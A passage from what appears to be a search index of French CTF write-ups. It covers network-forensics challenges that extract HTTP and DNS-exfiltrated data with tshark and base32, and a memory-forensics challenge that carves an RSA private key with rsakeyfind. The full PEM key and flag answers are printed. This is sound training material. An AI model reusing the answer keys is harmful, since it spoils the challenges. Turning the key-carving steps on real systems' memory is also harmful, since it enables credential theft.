9biu8I97GaoN6EuJyMt414HkQ9l} Et bingo, je r\u00e9cup\u00e8re le flag !","title":"Exfiltration 1"},{"location":"ctf/esnhack2020/exfiltration1/#exfiltration-1","text":"","title":"EXFILTRATION 1"},{"location":"ctf/esnhack2020/exfiltration1/#enonce","text":"Lors de l'intrusion, un hacker de l'ESNA a d\u00e9cid\u00e9 d'exfiltrer de la data du serveur. Cette fois-ci, il a \u00e9t\u00e9 plus ing\u00e9nieux et a d\u00e9cid\u00e9 de brouiller les pistes. A vous de jouer ! Cr\u00e9ateur du challenge : Cabir","title":"\u00c9nonc\u00e9"},{"location":"ctf/esnhack2020/exfiltration1/#analyse-du-trafic","text":"En ouvrant la capture avec Wireshark, on remarque qu'il y a un fort trafic http : En suivant le flux tcp 2, on observe la requ\u00eate http suivante : GET / HTTP/1.1 Host: 0.0.0.0:2000 User-Agent: python-requests/2.22.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Length: 1 EHTTP/1.0 200 OK Server: SimpleHTTP/0.6 Python/3.6.9 Date: Thu, 23 Apr 2020 22:59:27 GMT Content-type: text/html; charset=utf-8 Content-Length: 559 <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"> <html> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"> <title>Directory listing for /</title> </head> <body> <h1>Directory listing for /</h1> <hr> <ul> <li><a href=\"Bigtits-russia\">Bigtits-russia</a></li> <li><a href=\"comment_perdre_son_gland_de_lait\">comment_perdre_son_gland_de_lait</a></li> <li><a href=\"free_pornhub_account\">free_pornhub_account</a></li> <li><a href=\"How_to_hack_CIA\">How_to_hack_CIA</a></li> </ul> <hr> </body> </html> En analysant plus profond\u00e9ment la requ\u00eate GET, on remarque un transfert de data : Plus largement, les requ\u00eates HTTP GET sont envoy\u00e9s vers 4 ports principaux, 2000,3000,4000 et 5000 sans vraiment de distinctions possibles.","title":"Analyse du trafic"},{"location":"ctf/esnhack2020/exfiltration1/#recuperation-des-donnees","text":"Je d\u00e9cide donc de commencer par r\u00e9cup\u00e9rer les donn\u00e9es qui circulent sur les \u00e9changes \u00e0 destination du port 2000. onosh@kali:/mnt/v# tshark -r exfiltration1.pcapng -Y 'http.request.method == \"GET\" && tcp.port eq 2000' -T fields -e http.file_data |tr -d '\\n' ESNHACK{ixzc9GadiiTDzlZvPimzd9CBQDK9GToTDTnNJGErAIJ7lg6QgkLsSrkTmVgoGlU3xzXU2JYM8HewgagbVKMbdk2gRf0qI08p0JN3fvmb2LSarum7vD78plL81GJ9IZrDMUoeB9dKsB6xAblomhDbAzr0mR4QypRkSNKldaW3lebS4dHoCt2QAneGLWg5VycgZi7BRq3PpLW4mDWX4O0SgtjYsaOEUE7oosLbheYTdLjZ6sNaT2hwJ6JqHGruQmIlPB91QvF5spDD8ubRewCfUQqeaFAJWD0grj259ZvrRhw79HhTr1uzRjl5BWI3asbIF1rV1C3jVk1Q3xUBGSKDR3QXFzc5Gx5CjXFfd6qQD64HpiukmNwBDhIi6O96y8XZZvyV65NZhILLfkk1o5HojrCkmcOTO84VVORJaxKGITOWPokOxICzjgCTwxcsVTLkPL4tgV43wwLoUODHOD0dgRUysj9wzvkbTaYhFpZMDmFMN2q8cgvoS8R1MHNH4xMnUHgD0IqSauSaCKnsc8w5fsa5RdCUAmsSDeEQQdacQKpOixC03B8Oh9f0AElq0yikBOfu5wD4X705rLDgVPhAYfjOPOb53JmQGhTTenmFrSUrc68NhrvqCDZFHdLkXiFrJL54e0fj9bsdYfNz3qrZEXysWkIAAjrLBVqb90qvE7cuwAoEy7XSbEUszLKI8EhGGVhJ7hXO9ZyuHw6c5FgRalGTANObBKoDAlYlDH18LdbfnJ51T8IghoqSWuu38vElvzMA9DE0PHFueMY3YdbdKKcbrKI1kSUWTP37ezNpJfCKZ5KySf9hpkJ0MQApyoEXMYCx0w0vigN345BlNp3f5d7cSytDlZAX5MNHDmnK3locztIQj7mILBe37QVVHyKnxoWsHiun8dtCc2rVN3igLKccajzM811yeUGCrVzfYauhs0OHeh93uIm5E07WLn3WbctWqx5comdi4JqkeTRCmhyjLrsYAQh7fyQeGj2ZGbmcupqHv2BtuFvHon2DYNwjkNNLOPdw4PdfyOO06LCZaixMsruRNjavvmsqpiz9VFbvQ1CqPU9WspwZWHm4xkWiblnqdWadkQem2Rhx9G5nqKdytwXvb9ujh8KzGxAi6GDTgeEsAX4FeX0sQrYrqL5Eh4DVYmoU4NFqudS7MeKEwvV4keQnDxEm15MeLGJlkAxLDQvJq88WDdIKMSS7Z4dY15xBQ5QpjV2avKfY4kbZ0SXXox3JaS31ymSfpwWdVOxL6K4QJJiCHPUjmoaxiO5QtvSjqnyHOOWUeorOS8zqJEmcipK2zZRTFxUj6XTbOghrgWt9JEG9lQp6esK0TUl1pvZsHyyPqea70Ajvfy3z8M30gWpr8Pb8ZQPd5HRUsRM4js0sXuAhu81j1Y79WfTn7bDRatTut2H1Y9kIPCUWU7TxX1XI2V6C5d1ALTjzqsA1o5hQATCPot4zvJU4dPPnwJMbjE5eMMK4jXdjk6WqJL3tNIdSuDR4uS6RyaOVIwV4g77SEnY44Pkbe7W36QGG6BvQhcpsI3Uy85cslrwNdTDtKSO5zn1jVKU7DJFoyEaVFRgOGH9QZpO7hdEteMviPOjzRrxIbtGACOrcGXl1QZUnzzinjaKgAUASQKoUflPedoVzEp00uferQx8iPGdckRU2d4gVF5FLAO6amN0Ls82uDpOLOxTNhCHawoYd3I2qQkoEnYvvyX1qOr2UKbSdGlpckD3FfEg9oiYPo2H4ym2HwLsm1LE8lNL28UyNEKBMuEfRIJmQLAWawu5u1Jw6qvbUqKLSgXAHbsOrMQCMnzGoIcmi1qgMUUbQaFZ0LV582zZFWdBMkAntjnHk68ud5zDgSSOoFyFubsT0AhWCHNT0pfoZPGBJK1pO514VwgQNuIbIiA9odSNWsJBrSjD1NvtwUisMNAVhyJq09fWeATz9P3yfPqW18EFl7Mr1Si4y5uxliD7th9biu8I97GaoN6EuJyMt414HkQ9l} Et bingo, je r\u00e9cup\u00e8re le flag !","title":"R\u00e9cup\u00e9ration des donn\u00e9es"},{"location":"ctf/esnhack2020/exfiltration2/","text":"EXFILTRATION 2 \u00c9nonc\u00e9 Cette fois-ci les attaquants ont chang\u00e9 de strat\u00e9gie. Nos experts n'arrivent a rien. Sur cette capture reseau, on pense qu'ils ont encore exfiltr\u00e9 quelques chose. On ne sait pas quoi, ni comment. Aidez-nous ! Cr\u00e9ateur du challenge : Cabir Analyse du trafic En ouvrant la capture avec Wireshark, on remarque qu'il y a un fort trafic DNS : Les noms de domaines interrog\u00e9s semblent louches, c\u2019est suspect car ces genres de (sous-domaines suspects longs / non lisibles par l\u2019homme) sont souvent consid\u00e9r\u00e9s comme des indicateurs d\u2019activit\u00e9s d\u2019exfiltration DNS. R\u00e9cup\u00e9ration des donn\u00e9es Je d\u00e9cide d'essayer d'extraire l'ensemble des sous domaines pour trouver le secret qu'ils gardent : onosh@kali:/mnt/v# tshark -r exfiltration_2.pcapng -T fields -e dns.qry.name -Y \"dns.qry.name\" | grep \"esnhack.fr\" | cut -d \".\" -f 1 | uniq -d 77mp7yaacbfemskgaaaqcaaaaeaacaaa77nqaq yaambaeaqcaibqeaqcambqgayeaycaibaeaqea mbqfayeqqcqkbeeascikbqhqycqlbyfqscince gq4dyqcairacqmcijreeatb4ibaeh73maegaid ambqiayebacaicaqbmeqweaqcaibaeaqcaibae aqcaibaeaqcaibaeaqcaibaeaqcaibaeaqcaib aeaqcaibaeaqcaibaeaqcaibb76caaiqqakual oqgairaabbcaidcea77raaduaaaaqcamaqcaia aaaaaaaaaaaaaaicaabqibiga4eat76eaanaca ibaeaqcaibaaaaaaaaaaaaaaaaaebagbafa375 ... oxa47hh77wi= On dirait que c'est du b64. J'enregistre l'ensemble des sous domaines sous forme d'une seule chaine dans le fichier res.txt afin de la d\u00e9coder : onosh@kali:/mnt/v# tshark -r exfiltration_2.pcapng -T fields -e dns.qry.name -Y \"dns.qry.name\" | grep \"esnhack.fr\" | cut -d \".\" -f 1 | uniq -d | tr -d '\\n' >res.txt Reconstitution des donn\u00e9es extraites En d\u00e9codant le fichier, je m'aper\u00e7ois que le fichier obtenu est inutile, le header efb9 a9ef ne correspond \u00e0 rien. onosh@kali:/mnt/v# base64 -d res.txt >res2.txt onosh@kali:/mnt/v# xxd res2.txt |head -n5 00000000: efb9 a9ef 269a 71b7 de9a c920 69a6 aa71 ....&.q.... i..q 00000010: a69a 69e6 9a71 a69a efb9 ea6a ac9a 6a66 ..i..q.....j..jf 00000020: da79 aa9c 6a26 ea79 aa9c 6a66 ea81 ac9e .y..j&.y..jf.... 00000030: 6b27 1a89 b69e 6aa7 9a99 ba9f 6b27 aaa9 k'....j.....k'.. 00000040: caa4 6de7 9ab1 c8a4 6ea8 6ac9 caa5 6f27 ..m.....n.j...o' onosh@kali:/mnt/v# file res2.txt res2.txt: data La RFC 4648 nous apprend qu'il existe le base16, base32 et base64 pour encoder des donn\u00e9es. Le base64 ayant \u00e9chou\u00e9, essayons le base32 ! Base32 utilise un ensemble de 32 caract\u00e8res. Les lettres de A \u00e0 Z en majuscules et les chiffres de 2 \u00e0 7. Il nous suffit donc de passer les lettres minuscules des sous domaines en lettres majuscules et de d\u00e9coder tout \u00e7a : root@DESKTOP-68IHLRN:/mnt/v# tshark -r exfiltration_2.pcapng -T fields -e dns.qry.name -Y \"dns.qry.name\" | grep \"esnhack.fr\" | cut -d \".\" -f 1 | uniq -d | tr -d '\\n' |tr 'a-z' 'A-Z' |base32 -d >file.dat Et cette fois ci, les headers sont beaucoup plus parlant :) root@DESKTOP-68IHLRN:/mnt/v# xxd file.dat |head -n5 00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001 ......JFIF...... 00000010: 0001 0000 ffdb 0043 0003 0202 0202 0203 .......C........ 00000020: 0202 0203 0303 0304 0604 0404 0404 0806 ................ 00000030: 0605 0609 080a 0a09 0809 090a 0c0f 0c0a ................ 00000040: 0b0e 0b09 090d 110d 0e0f 1010 1110 0a0c ................","title":"Exfiltration 2"},{"location":"ctf/esnhack2020/exfiltration2/#exfiltration-2","text":"","title":"EXFILTRATION 2"},{"location":"ctf/esnhack2020/exfiltration2/#enonce","text":"Cette fois-ci les attaquants ont chang\u00e9 de strat\u00e9gie. Nos experts n'arrivent a rien. Sur cette capture reseau, on pense qu'ils ont encore exfiltr\u00e9 quelques chose. On ne sait pas quoi, ni comment. Aidez-nous ! Cr\u00e9ateur du challenge : Cabir","title":"\u00c9nonc\u00e9"},{"location":"ctf/esnhack2020/exfiltration2/#analyse-du-trafic","text":"En ouvrant la capture avec Wireshark, on remarque qu'il y a un fort trafic DNS : Les noms de domaines interrog\u00e9s semblent louches, c\u2019est suspect car ces genres de (sous-domaines suspects longs / non lisibles par l\u2019homme) sont souvent consid\u00e9r\u00e9s comme des indicateurs d\u2019activit\u00e9s d\u2019exfiltration DNS.","title":"Analyse du trafic"},{"location":"ctf/esnhack2020/exfiltration2/#recuperation-des-donnees","text":"Je d\u00e9cide d'essayer d'extraire l'ensemble des sous domaines pour trouver le secret qu'ils gardent : onosh@kali:/mnt/v# tshark -r exfiltration_2.pcapng -T fields -e dns.qry.name -Y \"dns.qry.name\" | grep \"esnhack.fr\" | cut -d \".\" -f 1 | uniq -d 77mp7yaacbfemskgaaaqcaaaaeaacaaa77nqaq yaambaeaqcaibqeaqcambqgayeaycaibaeaqea mbqfayeqqcqkbeeascikbqhqycqlbyfqscince gq4dyqcairacqmcijreeatb4ibaeh73maegaid ambqiayebacaicaqbmeqweaqcaibaeaqcaibae aqcaibaeaqcaibaeaqcaibaeaqcaibaeaqcaib aeaqcaibaeaqcaibaeaqcaibb76caaiqqakual oqgairaabbcaidcea77raaduaaaaqcamaqcaia aaaaaaaaaaaaaaicaabqibiga4eat76eaanaca ibaeaqcaibaaaaaaaaaaaaaaaaaebagbafa375 ... oxa47hh77wi= On dirait que c'est du b64. J'enregistre l'ensemble des sous domaines sous forme d'une seule chaine dans le fichier res.txt afin de la d\u00e9coder : onosh@kali:/mnt/v# tshark -r exfiltration_2.pcapng -T fields -e dns.qry.name -Y \"dns.qry.name\" | grep \"esnhack.fr\" | cut -d \".\" -f 1 | uniq -d | tr -d '\\n' >res.txt","title":"R\u00e9cup\u00e9ration des donn\u00e9es"},{"location":"ctf/esnhack2020/exfiltration2/#reconstitution-des-donnees-extraites","text":"En d\u00e9codant le fichier, je m'aper\u00e7ois que le fichier obtenu est inutile, le header efb9 a9ef ne correspond \u00e0 rien. onosh@kali:/mnt/v# base64 -d res.txt >res2.txt onosh@kali:/mnt/v# xxd res2.txt |head -n5 00000000: efb9 a9ef 269a 71b7 de9a c920 69a6 aa71 ....&.q.... i..q 00000010: a69a 69e6 9a71 a69a efb9 ea6a ac9a 6a66 ..i..q.....j..jf 00000020: da79 aa9c 6a26 ea79 aa9c 6a66 ea81 ac9e .y..j&.y..jf.... 00000030: 6b27 1a89 b69e 6aa7 9a99 ba9f 6b27 aaa9 k'....j.....k'.. 00000040: caa4 6de7 9ab1 c8a4 6ea8 6ac9 caa5 6f27 ..m.....n.j...o' onosh@kali:/mnt/v# file res2.txt res2.txt: data La RFC 4648 nous apprend qu'il existe le base16, base32 et base64 pour encoder des donn\u00e9es. Le base64 ayant \u00e9chou\u00e9, essayons le base32 ! Base32 utilise un ensemble de 32 caract\u00e8res. Les lettres de A \u00e0 Z en majuscules et les chiffres de 2 \u00e0 7. Il nous suffit donc de passer les lettres minuscules des sous domaines en lettres majuscules et de d\u00e9coder tout \u00e7a : root@DESKTOP-68IHLRN:/mnt/v# tshark -r exfiltration_2.pcapng -T fields -e dns.qry.name -Y \"dns.qry.name\" | grep \"esnhack.fr\" | cut -d \".\" -f 1 | uniq -d | tr -d '\\n' |tr 'a-z' 'A-Z' |base32 -d >file.dat Et cette fois ci, les headers sont beaucoup plus parlant :) root@DESKTOP-68IHLRN:/mnt/v# xxd file.dat |head -n5 00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001 ......JFIF...... 00000010: 0001 0000 ffdb 0043 0003 0202 0202 0203 .......C........ 00000020: 0202 0203 0303 0304 0604 0404 0404 0806 ................ 00000030: 0605 0609 080a 0a09 0809 090a 0c0f 0c0a ................ 00000040: 0b0e 0b09 090d 110d 0e0f 1010 1110 0a0c ................","title":"Reconstitution des donn\u00e9es extraites"},{"location":"ctf/fcsc2020/administration/","text":"Acad\u00e9mie de l'investigation - Administration Ce poste administre un serveur distant avec le protocole SSH \u00e0 l'aide d'une authentification par cl\u00e9 (cl\u00e9 prot\u00e9g\u00e9e par mot de passe). La cl\u00e9 publique a \u00e9t\u00e9 utilis\u00e9e pour chiffrer le message ci-joint (flag.txt.enc). Retrouvez et reconstituez la cl\u00e9 en m\u00e9moire qui permettra de d\u00e9chiffrer ce message. dmp.tar.gz \u00c9tape 1 - Recherche d'une cl\u00e9 avec volatility Nous devons retrouver une cl\u00e9 (priv\u00e9) RSA dans la m\u00e9moire, c'est parti, et avec volatility. Apr\u00e8s avoir test\u00e9 et v\u00e9rifi\u00e9 absolument tous les plugins volatility existant je ne trouve aucune trace de cl\u00e9 rsa dans ce dump. J'ai simplement un visuel sur l'existance de cette cl\u00e9 avec strings : onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# strings ../dmp/dmp.mem |grep -inH --color 'id_rsa' (standard input):1078026:Enter passphrase for key '/home/Lesage/.ssh/id_rsa': (standard input):1788358:Enter passphrase for key '/home/Lesage/.ssh/id_rsa': (standard input):2191305:h/id_rsa (standard input):2441815:/id_rsa' (standard input):3498355:Enter passphrase for key '/home/Lesage/.ssh/id_rsa': Et si volatility ne suffisait pas ? \u00c9tape 2 - RSAKEYFIND Je d\u00e9couvre en cherchant sur notre bon vieux google, un outil, rsakeyfind. Il existe dans les d\u00e9pot debian, le nom est plutot attirant, et en plus il prend en entrer un dump m\u00e9moire... Wow, magique, il nous trouve deux cl\u00e9s. onosh@kali:/home/onosh/FCSC/FORENSIC# rsakeyfind dmp/dmp.mem FOUND PRIVATE KEY AT c64ac50 version = 00 modulus = 00 d7 1e 77 82 8c 92 31 e7 69 02 a2 d5 5c 78 de a2 0c 8f fe 28 59 31 df 40 9c 60 61 06 b9 2f 62 40 80 76 cb 67 4a b5 59 56 69 17 07 fa f9 4c bd 6c 37 7a 46 7d 70 a7 67 22 b3 4d 7a 94 c3 ba 4b 7c 4b a9 32 7c b7 38 95 45 64 a4 05 a8 9f 12 7c 4e c6 c8 2d 40 06 30 f4 60 a6 91 bb 9b ca 04 79 11 13 75 f0 ae d3 51 89 c5 74 b9 aa 3f b6 83 e4 78 6b cd f9 5c 4c 85 ea 52 3b 51 93 fc 14 6b 33 5d 30 70 fa 50 1b 1b 38 81 13 8d f7 a5 0c c0 8e f9 63 52 18 4e a9 f9 f8 5c 5d cd 7a 0d d4 8e 7b ee 91 7b ad 7d b4 92 d5 ab 16 3b 0a 8a ce 8e de 47 1a 17 01 86 7b ab 99 f1 4b 0c 3a 0d 82 47 c1 91 8c bb 2e 22 9e 49 63 6e 02 c1 c9 3a 9b a5 22 1b 07 95 d6 10 02 50 fd fd d1 9b be ab c2 c0 74 d7 ec 00 fb 11 71 cb 7a dc 81 79 9f 86 68 46 63 82 4d b7 f1 e6 16 6f 42 63 f4 94 a0 ca 33 cc 75 13 publicExponent = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 privateExponent = 62 b5 60 31 4f 3f 66 16 c1 60 ac 47 2a ff 6b 69 00 4a b2 5c e1 50 b9 18 74 a8 e4 dc a8 ec cd 30 bb c1 c6 e3 c6 ac 20 2a 3e 5e 8b 12 e6 82 08 09 38 0b ab 7c b3 cc 9c ce 97 67 dd ef 95 40 4e 92 e2 44 e9 1d c1 14 fd a9 b1 dc 71 9c 46 21 bd 58 88 6e 22 15 56 c1 ef e0 c9 8d e5 80 3e da 7e 93 0f 52 f6 f5 c1 91 90 9e 42 49 4f 8d 9c ba 38 83 e9 33 c2 50 4f ec c2 f0 a8 b7 6e 28 25 56 6b 62 67 fe 08 f1 56 e5 6f 0e 99 f1 e5 95 7b ef eb 0a 2c 92 97 57 23 33 36 07 dd fb ae f1 b1 d8 33 b7 96 71 42 36 c5 a4 a9 19 4b 1b 52 4c 50 69 91 f0 0e fa 80 37 4b b5 d0 2f b7 44 0d d4 f8 39 8d ab 71 67 59 05 88 3d eb 48 48 33 88 4e fe f8 27 1b d6 55 60 5e 48 b7 6d 9a a8 37 f9 7a de 1b cd 5d 1a 30 d4 e9 9e 5b 3c 15 f8 9c 1f da d1 86 48 55 ce 83 ee 8e 51 c7 de 32 12 47 7d 46 b8 35 df 41 prime1 = 00 prime2 = 00 exponent1 = 00 exponent2 = 00 coefficient = 00 FOUND PRIVATE KEY AT 1084c490 version = 00 modulus = 00 d7 1e 77 82 8c 92 31 e7 69 02 a2 d5 5c 78 de a2 0c 8f fe 28 59 31 df 40 9c 60 61 06 b9 2f 62 40 80 76 cb 67 4a b5 59 56 69 17 07 fa f9 4c bd 6c 37 7a 46 7d 70 a7 67 22 b3 4d 7a 94 c3 ba 4b 7c 4b a9 32 7c b7 38 95 45 64 a4 05 a8 9f 12 7c 4e c6 c8 2d 40 06 30 f4 60 a6 91 bb 9b ca 04 79 11 13 75 f0 ae d3 51 89 c5 74 b9 aa 3f b6 83 e4 78 6b cd f9 5c 4c 85 ea 52 3b 51 93 fc 14 6b 33 5d 30 70 fa 50 1b 1b 38 81 13 8d f7 a5 0c c0 8e f9 63 52 18 4e a9 f9 f8 5c 5d cd 7a 0d d4 8e 7b ee 91 7b ad 7d b4 92 d5 ab 16 3b 0a 8a ce 8e de 47 1a 17 01 86 7b ab 99 f1 4b 0c 3a 0d 82 47 c1 91 8c bb 2e 22 9e 49 63 6e 02 c1 c9 3a 9b a5 22 1b 07 95 d6 10 02 50 fd fd d1 9b be ab c2 c0 74 d7 ec 00 fb 11 71 cb 7a dc 81 79 9f 86 68 46 63 82 4d b7 f1 e6 16 6f 42 63 f4 94 a0 ca 33 cc 75 13 publicExponent = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 privateExponent = 62 b5 60 31 4f 3f 66 16 c1 60 ac 47 2a ff 6b 69 00 4a b2 5c e1 50 b9 18 74 a8 e4 dc a8 ec cd 30 bb c1 c6 e3 c6 ac 20 2a 3e 5e 8b 12 e6 82 08 09 38 0b ab 7c b3 cc 9c ce 97 67 dd ef 95 40 4e 92 e2 44 e9 1d c1 14 fd a9 b1 dc 71 9c 46 21 bd 58 88 6e 22 15 56 c1 ef e0 c9 8d e5 80 3e da 7e 93 0f 52 f6 f5 c1 91 90 9e 42 49 4f 8d 9c ba 38 83 e9 33 c2 50 4f ec c2 f0 a8 b7 6e 28 25 56 6b 62 67 fe 08 f1 56 e5 6f 0e 99 f1 e5 95 7b ef eb 0a 2c 92 97 57 23 33 36 07 dd fb ae f1 b1 d8 33 b7 96 71 42 36 c5 a4 a9 19 4b 1b 52 4c 50 69 91 f0 0e fa 80 37 4b b5 d0 2f b7 44 0d d4 f8 39 8d ab 71 67 59 05 88 3d eb 48 48 33 88 4e fe f8 27 1b d6 55 60 5e 48 b7 6d 9a a8 37 f9 7a de 1b cd 5d 1a 30 d4 e9 9e 5b 3c 15 f8 9c 1f da d1 86 48 55 ce 83 ee 8e 51 c7 de 32 12 47 7d 46 b8 35 df 41 prime1 = 00 prime2 = 00 exponent1 = 00 exponent2 = 00 coefficient = 00 La premi\u00e8re ne fonctionne pas, je test la deuxi\u00e8me avec ce petit script : from Crypto.PublicKey import RSA modulus = '00d71e77828c9231e76902a2d55c78dea20c8ffe285931df409c606106b92f62408076cb674ab55956691707faf94cbd6c377a467d70a76722b34d7a94c3ba4b7c4ba9327cb738954564a405a89f127c4ec6c82d400630f460a691bb9bca0479111375f0aed35189c574b9aa3fb683e4786bcdf95c4c85ea523b5193fc146b335d3070fa501b1b3881138df7a50cc08ef96352184ea9f9f85c5dcd7a0dd48e7bee917bad7db492d5ab163b0a8ace8ede471a1701867bab99f14b0c3a0d8247c1918cbb2e229e49636e02c1c93a9ba5221b0795d6100250fdfdd19bbeabc2c074d7ec00fb1171cb7adc81799f86684663824db7f1e6166f4263f494a0ca33cc7513' publicExponent = '10001' privateExponent = '62b560314f3f6616c160ac472aff6b69004ab25ce150b91874a8e4dca8eccd30bbc1c6e3c6ac202a3e5e8b12e6820809380bab7cb3cc9cce9767ddef95404e92e244e91dc114fda9b1dc719c4621bd58886e221556c1efe0c98de5803eda7e930f52f6f5c191909e42494f8d9cba3883e933c2504fecc2f0a8b76e2825566b6267fe08f156e56f0e99f1e5957befeb0a2c92975723333607ddfbaef1b1d833b796714236c5a4a9194b1b524c506991f00efa80374bb5d02fb7440dd4f8398dab71675905883deb484833884efef8271bd655605e48b76d9aa837f97ade1bcd5d1a30d4e99e5b3c15f89c1fdad1864855ce83ee8e51c7de3212477d46b835df41' modulus_int = long(modulus,16) publicExponent_int = long(publicExponent, 16) privateExponent_int = long(privateExponent, 16) private_key = RSA.construct((modulus_int, publicExponent_int, privateExponent_int)) pem_key = private_key.exportKey('PEM') print(pem_key) Il me resors gentiment une cl\u00e9 priv\u00e9 : -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEA1x53goySMedpAqLVXHjeogyP/ihZMd9AnGBhBrkvYkCAdstn SrVZVmkXB/r5TL1sN3pGfXCnZyKzTXqUw7pLfEupMny3OJVFZKQFqJ8SfE7GyC1A BjD0YKaRu5vKBHkRE3XwrtNRicV0uao/toPkeGvN+VxMhepSO1GT/BRrM10wcPpQ Gxs4gRON96UMwI75Y1IYTqn5+FxdzXoN1I577pF7rX20ktWrFjsKis6O3kcaFwGG e6uZ8UsMOg2CR8GRjLsuIp5JY24Cwck6m6UiGweV1hACUP390Zu+q8LAdNfsAPsR cct63IF5n4ZoRmOCTbfx5hZvQmP0lKDKM8x1EwIDAQABAoIBAGK1YDFPP2YWwWCs Ryr/a2kASrJc4VC5GHSo5Nyo7M0wu8HG48asICo+XosS5oIICTgLq3yzzJzOl2fd 75VATpLiROkdwRT9qbHccZxGIb1YiG4iFVbB7+DJjeWAPtp+kw9S9vXBkZCeQklP jZy6OIPpM8JQT+zC8Ki3biglVmtiZ/4I8Vblbw6Z8eWVe+/rCiySl1cjMzYH3fuu 8bHYM7eWcUI2xaSpGUsbUkxQaZHwDvqAN0u10C+3RA3U+DmNq3FnWQWIPetISDOI Tv74JxvWVWBeSLdtmqg3+XreG81dGjDU6Z5bPBX4nB/a0YZIVc6D7o5Rx94yEkd9 Rrg130ECgYEA5Eyu3hb9n4NVW4RKzxzxN5Wtyil/LW4ygaQrJhSWHUAF7AyvPyxv LOi/He7Qs+98W56ITyqLDkq9t4z6EA472mitQSvklvp/gFJfB58OO16WRRoTK5TO HwdphTX8aWNb+Pg/zp1AHnyt+57O4AH471ld3AB5q4o/gKJ2MpSp6mUCgYEA8Thg kA0MLj005ZDqIUMfaGMWeyWN3oIrUvij/Q855+leMnUVfdDJzgbl+6nLIuXbSQny 5relp3UukS0rXfFIYUVD1738EXO1EZ+yGDpvNqfC0xhN8MUfcIybxR2VqFqejLFL aiqEdizYT0ewgYQCRfCF+AxtpwxNLLJbgXD9bhcCgYEAjQfF+pJPSMvT3f4CTKF/ bav8OOeblc/+SVHGCfcrqJQVVHWdiLQFVcPN1ErkCFPICb0MTYNldYW8XvgqveJd HRYO+TSJOK80NmwsIkQigZBz2eo6r3B0SHzGtbDc5amodku89wDzTCIPRGIdQApX 4lvdfHuardpwUiGKTMLDmHUCgYEA7SRcoiGBoQ+hKjMOSccAYJJRbp2b3G0iBH7W URmf9uORLI+4oikZzEcx3/ir8NICg8qZFsLiwz9LmYPLh56GZsI+kSGAZvPWxc22 u2TvIs9IlFjnftV8NBy3otCT6Z+1EWHXXzcPZFJwEXjMCHfr+DAetJ4bSseoM1Hg 7d9T9t8CgYEAhtlM7mVhwRmp1XSb1cr2gysGtCD+RSno4/rhTyiOYy90wzpcmvWe Dg3F/qBMAM57pBkXWa8TOgOPVPVgOS7ZBrN81pAGQXfzk+F6AUHBj/5MiDnb3nGe WNFJUICyWk9pi7j+Y9RCPTdhqEz/tplM9FHgRKppeT+BpGE9JukEUmQ= -----END RSA PRIVATE KEY----- J'essaye de d\u00e9chiffrer le fichier avec la cl\u00e9 trouv\u00e9e : onosh@kali:/home/onosh/FCSC/FORENSIC/rsakeyfind-master# openssl rsautl -decrypt -inkey THEKEY.txt -in flag.txt.enc -out flag.txt && cat flag.txt FCSC{ac5cad66114d4866a4b55e43cb8896cc4947855241b5af8d2f8a123c36083d98}","title":"4. Administration"},{"location":"ctf/fcsc2020/administration/#academie-de-linvestigation-administration","text":"Ce poste administre un serveur distant avec le protocole SSH \u00e0 l'aide d'une authentification par cl\u00e9 (cl\u00e9 prot\u00e9g\u00e9e par mot de passe). La cl\u00e9 publique a \u00e9t\u00e9 utilis\u00e9e pour chiffrer le message ci-joint (flag.txt.enc). Retrouvez et reconstituez la cl\u00e9 en m\u00e9moire qui permettra de d\u00e9chiffrer ce message. dmp.tar.gz","title":"Acad\u00e9mie de l'investigation - Administration"},{"location":"ctf/fcsc2020/administration/#etape-1-recherche-dune-cle-avec-volatility","text":"Nous devons retrouver une cl\u00e9 (priv\u00e9) RSA dans la m\u00e9moire, c'est parti, et avec volatility. Apr\u00e8s avoir test\u00e9 et v\u00e9rifi\u00e9 absolument tous les plugins volatility existant je ne trouve aucune trace de cl\u00e9 rsa dans ce dump. J'ai simplement un visuel sur l'existance de cette cl\u00e9 avec strings : onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# strings ../dmp/dmp.mem |grep -inH --color 'id_rsa' (standard input):1078026:Enter 